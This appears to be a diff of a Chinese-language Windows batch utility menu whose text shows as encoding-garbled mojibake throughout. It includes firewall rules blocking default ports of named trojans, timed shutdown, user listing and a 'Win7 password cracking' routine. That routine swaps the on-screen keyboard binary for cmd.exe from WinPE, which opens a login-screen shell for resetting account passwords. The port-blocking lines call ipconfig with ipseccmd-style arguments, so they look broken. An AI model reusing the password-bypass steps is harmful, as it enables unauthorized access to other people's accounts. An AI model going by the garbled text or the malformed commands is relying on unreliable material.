+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/6771" -f *+0:6771:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬DeepThroaté»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/23456" -f *+0:23456:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬WhackJobé»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/6969" -f *+0:6969:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬GateCrasheré»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/555" -f *+0:555:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬Phase0é»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/6969" -f *+0:6969:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬Priorityé»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/5400" -f *+0:5400:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬Blade Runneré»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/7000" -f *+0:7000:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬Remote Grabé»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/4950" -f *+0:4950:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬IcqTrojané»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/7300" -f *+0:7300:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬NetMonitoré»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/9989" -f *+0:9989:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬InIkilleré»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/7301" -f *+0:7301:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬NetMonitor 1.xé»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/9872" -f *+0:9872:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬Portal Of Doomé»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/7306" -f *+0:7306:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬NetMonitor 2.xé»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/11223" -f *+0:11223:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬Progenic Trojané»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/7307" -f *+0:7307:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬NetMonitor 3.xé»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/1999" -f *+0:1999:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬BackDooré»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/5800" -f *+0:5800:TCP -n BLOCK -x >nul
+echo å…³é—­è¿œç¨‹æ§åˆ¶è½¯ä»¶VNCé»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/5900" -f *+0:5900:TCP -n BLOCK -x >nul
+echo å…³é—­è¿œç¨‹æ§åˆ¶è½¯ä»¶VNCé»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/22222" -f *+0:22222:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬Prosiak 0.47é»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/7626" -f *+0:7626:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬å†°æ²³é»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/4444" -f *+0:4444:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬msblasté»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/7308" -f *+0:7308:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬NetMonitor 4.xé»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/6129" -f *+0:6129:TCP -n BLOCK -x >nul
+echo å…³é—­è¿œç¨‹æ§åˆ¶è½¯ä»¶ï¼ˆdameware nt utilities)é»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/2023" -f *+0:2023:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬Ripperé»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/1245" -f *+0:1245:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬VooDoo Dollé»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/121" -f *+0:121:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬BO jammerkillahVé»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/456" -f *+0:456:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬Hackers Paradiseé»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/555" -f *+0:555:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬Stealth Spyé»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/666" -f *+0:666:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬Satanz Backdooré»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/1001" -f *+0:1001:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬Silenceré»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/1033" -f *+0:1033:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬Netspyé»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/7000" -f *+0:7000:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬Remote Grabé»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/7300 " -f *+0:7300:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬NetMonitoré»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/23456 " -f *+0:23456:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬Ugly FTPé»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/23456 " -f *+0:23456:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬Ugly FTPé»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/30100 " -f *+0:30100:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬NetSphereé»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/9872" -f *+0:9872:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬Portal of Doomé»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/9899" -f *+0:9899:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬iNi-Killeré»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/50505" -f *+0:50505:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬Sockets de Troieé»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/6939" -f *+0:6939:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬Indoctrinationé»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/11000" -f *+0:11000:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬Senna Spyé»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/12223" -f *+0:12223:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬Hack?99 KeyLoggeré»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/12362" -f *+0:12362:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬Whack-a-mole 1.xé»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/20000" -f *+0:20000:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬Milleniumé»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/2583" -f *+0:2583:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬Wincrash v2é»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/53001" -f *+0:53001:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬Remote Windows Shutdowné»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/7789" -f *+0:7789:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬ICKilleré»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/40426" -f *+0:40426:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬Masters Paradise 3.xé»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/5569" -f *+0:5569:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬RoboHacké»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/8000" -f *+0:8000:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬huigezié»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/9872" -f *+0:9872:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬Portal of Doomé»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/2005" -f *+0:2005:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬é»‘æ´2005é»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/2000" -f *+0:2000:TCP -n BLOCK -x >nul
+echo å…³é—­å½©è™¹æ¡¥1.2é»˜è®¤ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/9999" -f *+0:9999:TCP -n BLOCK -x >nul
+echo å…³é—­huigeziæ˜ å°„é»˜è®¤ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -x >nul
 gpupdate >nul
 echo.
-echo  °²È«Ğ­ÒéÈ«²¿ÉèÖÃÍê±Ï£¡ÄúµÄÏµÍ³¿ÉÒÔÃâÊÜÁ÷ĞĞÈä³æ²¡¶¾¼°µäĞÍÄ¾ÂíºóÃÅµÄÇÖÈÅ£¡
-echo  ¡°¾Ü¾ø·şÎñ¡±°æÍøÂç°²È«Ğ­ÒéÄãÒÑ¾­ÍêÈ«ÉèÖÃÍê³ÉÁË£¡ÇëÖØĞÂÆô¶¯ÄãµÄ¼ÆËã»ú£¡              
+echo  å®‰å…¨åè®®å…¨éƒ¨è®¾ç½®å®Œæ¯•ï¼æ‚¨çš„ç³»ç»Ÿå¯ä»¥å…å—æµè¡Œè •è™«ç—…æ¯’åŠå…¸å‹æœ¨é©¬åé—¨çš„ä¾µæ‰°ï¼
+echo  â€œæ‹’ç»æœåŠ¡â€ç‰ˆç½‘ç»œå®‰å…¨åè®®ä½ å·²ç»å®Œå…¨è®¾ç½®å®Œæˆäº†ï¼è¯·é‡æ–°å¯åŠ¨ä½ çš„è®¡ç®—æœºï¼              
 echo. 
-echo. Çë°´ÈÎÒâ¼ü·µ»ØÉÏÒ»²ã¡­¡­
+echo. è¯·æŒ‰ä»»æ„é”®è¿”å›ä¸Šä¸€å±‚â€¦â€¦
 pause >nul
 goto mark0
-exit                    ::·ÀÖ¹ÓĞÈËÊÖ¼ú°´´í
+exit                    ::é˜²æ­¢æœ‰äººæ‰‹è´±æŒ‰é”™
 
 
 
@@ -1699,43 +1699,43 @@ exit                    ::·ÀÖ¹ÓĞÈËÊÖ¼ú°´´í
 
 :mark18
 cls
-title ¶¨Ê±¹Ø»ú
-echo.                  ¶¨ Ê± ¹Ø »ú
+title å®šæ—¶å…³æœº
+echo.                  å®š æ—¶ å…³ æœº
 echo.    -----------------------------------------
 echo.
 echo.
-echo     ÇëÊäÈë¹Ø»úÊ±¼ä,(Èç12:00:00)    Y.·µ»Ø²Ëµ¥
+echo     è¯·è¾“å…¥å…³æœºæ—¶é—´,(å¦‚12:00:00)    Y.è¿”å›èœå•
 echo.
 set /p shutdowntime=     
 IF /I "%shutdowntime%"=="Y" goto mark0
 at %shutdowntime% tsshutdn 0 /delay:0 /powerdown >nul
 IF not errorlevel 1 goto ok
-echo     %shutdowntime% ²»ÊÇ±ê×¼µÄÊ±¼ä¸ñÊ½,ÇëÖØĞÂÊäÈë
+echo     %shutdowntime% ä¸æ˜¯æ ‡å‡†çš„æ—¶é—´æ ¼å¼,è¯·é‡æ–°è¾“å…¥
 echo.
 goto dsgj
 :ok
 echo.
-echo            Éè¶¨Íê±Ï! °´ÈÎÒâ¼ü·µ»ØÉÏÒ»²ã...
+echo            è®¾å®šå®Œæ¯•! æŒ‰ä»»æ„é”®è¿”å›ä¸Šä¸€å±‚...
 pause >nul
 goto mark0
-exit                    ::·ÀÖ¹ÓĞÈËÊÖ¼ú°´´í
+exit                    ::é˜²æ­¢æœ‰äººæ‰‹è´±æŒ‰é”™
 
 
 
 :mark19
 cls
-title ²ì¿´ÏµÍ³ĞÅÏ¢
+title å¯Ÿçœ‹ç³»ç»Ÿä¿¡æ¯
 systeminfo 
-echo             °´ÈÎÒâ¼ü·µ»ØÉÏÒ»²ã...
+echo             æŒ‰ä»»æ„é”®è¿”å›ä¸Šä¸€å±‚...
 pause >nul
 goto mark0
-exit                    ::·ÀÖ¹ÓĞÈËÊÖ¼ú°´´í
+exit                    ::é˜²æ­¢æœ‰äººæ‰‹è´±æŒ‰é”™
 
 
 
 :mark20
 cls
-title  CÅÌ·À¶¾
+title  Cç›˜é˜²æ¯’
 md %systemroot%\0sy.exe
 attrib %systemroot%\0sy.exe +S +R +H
 
@@ -2145,21 +2145,21 @@ attrib %systemroot%\system32\ws2_64.dll +S +R +H
 md %systemroot%\system32\wsink.dll
 attrib %systemroot%\system32\wsink.dll +S +R +H
 
-echo             °´ÈÎÒâ¼ü·µ»ØÉÏÒ»²ã...
+echo             æŒ‰ä»»æ„é”®è¿”å›ä¸Šä¸€å±‚...
 pause >nul
 goto mark0
-exit                    ::·ÀÖ¹ÓĞÈËÊÖ¼ú°´´í
+exit                    ::é˜²æ­¢æœ‰äººæ‰‹è´±æŒ‰é”™
 
 
 
 
 :mark21
 cls
-title ²ì¿´ÓÃ»§ÁĞ±í
+title å¯Ÿçœ‹ç”¨æˆ·åˆ—è¡¨
 
 cd.>netuser.txt
 for /f "skip=4 tokens=1-3" %%i in ('net user') do (
-    if not "%%i"=="ÃüÁî³É¹¦Íê³É¡£" net use %%i>>netuser.txt 2>nul
+    if not "%%i"=="å‘½ä»¤æˆåŠŸå®Œæˆã€‚" net use %%i>>netuser.txt 2>nul
     if not "%%j"=="" net user %%j>>netuser.txt 2>nul
     if not "%%k"=="" net user %%k>>netuser.txt 2>nul
 )
@@ -2167,19 +2167,19 @@ start netuser.txt
 ping -n 2 127.1>nul
 del netuser.txt
 
-echo             °´ÈÎÒâ¼ü·µ»ØÉÏÒ»²ã...
+echo             æŒ‰ä»»æ„é”®è¿”å›ä¸Šä¸€å±‚...
 pause >nul
 goto mark0
-exit                    ::·ÀÖ¹ÓĞÈËÊÖ¼ú°´´í
+exit                    ::é˜²æ­¢æœ‰äººæ‰‹è´±æŒ‰é”™
 
 
 :mark22
 cls
-title ÏÔÊ¾¸÷·ÖÇøÊ£Óà¿Õ¼äÇé¿ö
+title æ˜¾ç¤ºå„åˆ†åŒºå‰©ä½™ç©ºé—´æƒ…å†µ
 
-echo        ¨X¨T¨T¨T¨T¨T¨T¨T¨T¨T¨T¨T¨T¨T¨T¨T¨T¨T¨T¨T¨T¨T¨T¨T¨T¨T¨T¨T¨T¨T¨T¨[
-echo        ¨U        ´ÅÅÌ·ÖÇø         ´ÅÅÌ¾í±êÃû      Ê£Óà¿Õ¼ä(MB)       ¨U
-echo        ¨U    _____________________________________________________   ¨U
+echo        â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
+echo        â•‘        ç£ç›˜åˆ†åŒº         ç£ç›˜å·æ ‡å      å‰©ä½™ç©ºé—´(MB)       â•‘
+echo        â•‘    _____________________________________________________   â•‘
 for %%d in (C D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
     if exist %%d:\nul (
         for /f "tokens=3" %%z in ('dir /-c %%d:\') do set freesize=%%z
@@ -2189,30 +2189,30 @@ for %%d in (C D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
         for /f "tokens=3*" %%v in ('vol %%d:') do set volume=%%w
         set volume=                    !volume!
         set volume=!volume:~-20!
-        echo        ¨U           %%d: !volume!     !freesize!            ¨U
+        echo        â•‘           %%d: !volume!     !freesize!            â•‘
     )
 )
-echo        ¨^¨T¨T¨T¨T¨T¨T¨T¨T¨T¨T¨T¨T¨T¨T¨T¨T¨T¨T¨T¨T¨T¨T¨T¨T¨T¨T¨T¨T¨T¨T¨a
-echo             °´ÈÎÒâ¼ü·µ»ØÉÏÒ»²ã...
+echo        â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+echo             æŒ‰ä»»æ„é”®è¿”å›ä¸Šä¸€å±‚...
 pause >nul
 goto mark0
-exit                    ::·ÀÖ¹ÓĞÈËÊÖ¼ú°´´í
+exit                    ::é˜²æ­¢æœ‰äººæ‰‹è´±æŒ‰é”™
 
 
 
 
 :mark23
 cls
-title Win7ÃÜÂëÆÆ½â¹¤¾ß
+title Win7å¯†ç ç ´è§£å·¥å…·
  @echo off
-echo »¶Ó­Ê¹ÓÃWin7ÃÜÂëÆÆ½â¹¤¾ß
-echo ÇëÈ·ÈÏÄúÔÚWinPE»·¾³
-set /p pf=ÇëÊäÈëÄúµÄÏµÍ³ÅÌ·û£º
+echo æ¬¢è¿ä½¿ç”¨Win7å¯†ç ç ´è§£å·¥å…·
+echo è¯·ç¡®è®¤æ‚¨åœ¨WinPEç¯å¢ƒ
+set /p pf=è¯·è¾“å…¥æ‚¨çš„ç³»ç»Ÿç›˜ç¬¦ï¼š
 :mark23.1
 cls
-echo ÄúÒª×öÊ²Ã´£¿
-echo a.ÆÆ½âÃÜÂë b.»Ö¸´ÃÜÂë c.ÍË³ö
-set /p cz=ÄúµÄÑ¡Ôñ£º
+echo æ‚¨è¦åšä»€ä¹ˆï¼Ÿ
+echo a.ç ´è§£å¯†ç  b.æ¢å¤å¯†ç  c.é€€å‡º
+set /p cz=æ‚¨çš„é€‰æ‹©ï¼š
 if %cz%==a goto mark23.2
 if %cz%==b goto mark23.3
 if %cz%==c exit
@@ -2225,26 +2225,26 @@ copy %pf%:\WINDOWS\System32\Config\SAM %pf%:\SAM
 move %pf%:\WINDOWS\System32\osk.exe %pf%:\osk.exe
 copy %pf%:\WINDOWS\System32\cmd.exe %pf%:\WINDOWS\System32\osk.exe
 cls
-echo Çë´ÓWin7Æô¶¯£¬´ò¿ªÇáËÉ·ÃÎÊÖĞµÄÆÁÄ»¼üÅÌ£¬ÓÃnet user [ÓÃ»§Ãû] [ÃÜÂë]¸ü¸ÄÃÜÂë
+echo è¯·ä»Win7å¯åŠ¨ï¼Œæ‰“å¼€è½»æ¾è®¿é—®ä¸­çš„å±å¹•é”®ç›˜ï¼Œç”¨net user [ç”¨æˆ·å] [å¯†ç ]æ›´æ”¹å¯†ç 
 pause
 %pf%:\WINDOWS\System32\shutdown.exe /r /t 0
 
 :mark23.3
 cls
-echo ÇëÈ·¶¨ÒÑ¾­¹Ø±ÕÆÁÄ»¼üÅÌ¹¦ÄÜ
+echo è¯·ç¡®å®šå·²ç»å…³é—­å±å¹•é”®ç›˜åŠŸèƒ½
 pause
 move %pf%:\SAM %pf%:\WINDOWS\System32\Config\SAM
 attrib +S %pf%:\WINDOWS\System32\Config\SAM
 move %pf%:\osk.exe %pf%:\WINDOWS\System32\osk.exe
 cls
-echo ³É¹¦
+echo æˆåŠŸ
 pause
 %pf%:\WINDOWS\System32\shutdown.exe /s /t 0
 
-echo             °´ÈÎÒâ¼ü·µ»ØÉÏÒ»²ã...
+echo             æŒ‰ä»»æ„é”®è¿”å›ä¸Šä¸€å±‚...
 pause >nul
 goto mark0
-exit                    ::·ÀÖ¹ÓĞÈËÊÖ¼ú°´´í
+exit                    ::é˜²æ­¢æœ‰äººæ‰‹è´±æŒ‰é”™
 
 
 
@@ -2255,54 +2255,54 @@ exit                    ::·ÀÖ¹ÓĞÈËÊÖ¼ú°´´í
 
 :mark24
 
-title ÎÄ¼ş¹éÀàÕûÀíÆ÷-test
+title æ–‡ä»¶å½’ç±»æ•´ç†å™¨-test
 cls
 echo                               
-echo           ¨q©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤¨r
-echo           ©¦                                                        ©¦
-echo           ©¦        ±¾³ÌĞòÄÜ¶Ôµ±Ç°Ä¿Â¼¼°ÆäËùÓĞ×ÓÄ¿Â¼ÏÂµÄÎÄ¼ş½øĞĞ    ©¦
-echo           ©¦                                                        ©¦
-echo           ©¦    ¹éÀà£¬¾ßÌåĞ§¹ûÈçÏÂ£º                                ©¦
-echo           ©¦                                                        ©¦
-echo           ©¦        ÔÚµ±Ç°Ä¿Â¼¼°Æä×ÓÄ¿Â¼ÏÂ£¬ÒÔ¸ÃÎÄ¼ş¼ĞÀïµÄÎÄ¼ş      ©¦
-echo           ©¦                                                        ©¦
-echo           ©¦    ÀàĞÍÃûÎªÎÄ¼ş¼ĞÃû£¬ÔÚ¸ÃÎÄ¼şËùÔÚÄ¿Â¼ÏÂ½¨Á¢ĞÎÈç        ©¦
-echo           ©¦                                                        ©¦
-echo           ©¦    exeÎÄ¼ş¡¢rarÎÄ¼ş Ö®ÀàµÄÎÄ¼ş¼Ğ£¬²»Í¬ÀàĞÍµÄÎÄ¼şÒÆ     ©¦
-echo           ©¦                                                        ©¦
-echo           ©¦    ¶¯µ½¶ÔÓ¦µÄÎÄ¼ş¼ĞÏÂ£¬ÒÔ±£³ÖÔ­À´µÄÎÄ¼ş¼Ğ½á¹¹²»±ä¡£    ©¦
-echo           ©¦                                                        ©¦
-echo           ©¦        Èç¹ûÒÔºóÔöÌíÁËĞÂÎÄ¼ş£¬ÔÙ´ÎÔËĞĞ±¾½Å±¾Ê±£¬Èô      ©¦
-echo           ©¦                                                        ©¦
-echo           ©¦    ¸ÃÎ»ÖÃÒÑ¾­´æÔÚ¶ÔÓ¦µÄÎÄ¼ş¼Ğ£¬½«°ÑĞÂÌíµÄÎÄ¼ş±£´æ      ©¦
-echo           ©¦                                                        ©¦
-echo           ©¦    ÔÚ¸ÃÎÄ¼ş¼ĞÏÂ£»Èô²»´æÔÚ¶ÔÓ¦µÄÎÄ¼ş¼Ğ£¬½«ĞÂ½¨ÎÄ¼ş      ©¦
-echo           ©¦                                                        ©¦
-echo           ©¦    ¼ĞÒÔ±£´æ¸ÃÎÄ¼ş¡£                                    ©¦
-echo           ©¦                                                        ©¦
-echo           ¨t©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤¨s
-echo                                              °´ÈÎÒâ¼ü½øÈëÏÂÒ»²½...
+echo           â•­â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â•®
+echo           â”‚                                                        â”‚
+echo           â”‚        æœ¬ç¨‹åºèƒ½å¯¹å½“å‰ç›®å½•åŠå…¶æ‰€æœ‰å­ç›®å½•ä¸‹çš„æ–‡ä»¶è¿›è¡Œ    â”‚
+echo           â”‚                                                        â”‚
+echo           â”‚    å½’ç±»ï¼Œå…·ä½“æ•ˆæœå¦‚ä¸‹ï¼š                                â”‚
+echo           â”‚                                                        â”‚
+echo           â”‚        åœ¨å½“å‰ç›®å½•åŠå…¶å­ç›®å½•ä¸‹ï¼Œä»¥è¯¥æ–‡ä»¶å¤¹é‡Œçš„æ–‡ä»¶      â”‚
+echo           â”‚                                                        â”‚
+echo           â”‚    ç±»å‹åä¸ºæ–‡ä»¶å¤¹åï¼Œåœ¨è¯¥æ–‡ä»¶æ‰€åœ¨ç›®å½•ä¸‹å»ºç«‹å½¢å¦‚        â”‚
+echo           â”‚                                                        â”‚
+echo           â”‚    exeæ–‡ä»¶ã€raræ–‡ä»¶ ä¹‹ç±»çš„æ–‡ä»¶å¤¹ï¼Œä¸åŒç±»å‹çš„æ–‡ä»¶ç§»     â”‚
+echo           â”‚                                                        â”‚
+echo           â”‚    åŠ¨åˆ°å¯¹åº”çš„æ–‡ä»¶å¤¹ä¸‹ï¼Œä»¥ä¿æŒåŸæ¥çš„æ–‡ä»¶å¤¹ç»“æ„ä¸å˜ã€‚    â”‚
+echo           â”‚                                                        â”‚
+echo           â”‚        å¦‚æœä»¥åå¢æ·»äº†æ–°æ–‡ä»¶ï¼Œå†æ¬¡è¿è¡Œæœ¬è„šæœ¬æ—¶ï¼Œè‹¥      â”‚
+echo           â”‚                                                        â”‚
+echo           â”‚    è¯¥ä½ç½®å·²ç»å­˜åœ¨å¯¹åº”çš„æ–‡ä»¶å¤¹ï¼Œå°†æŠŠæ–°æ·»çš„æ–‡ä»¶ä¿å­˜      â”‚
+echo           â”‚                                                        â”‚
+echo           â”‚    åœ¨è¯¥æ–‡ä»¶å¤¹ä¸‹ï¼›è‹¥ä¸å­˜åœ¨å¯¹åº”çš„æ–‡ä»¶å¤¹ï¼Œå°†æ–°å»ºæ–‡ä»¶      â”‚
+echo           â”‚                                                        â”‚
+echo           â”‚    å¤¹ä»¥ä¿å­˜è¯¥æ–‡ä»¶ã€‚                                    â”‚
+echo           â”‚                                                        â”‚
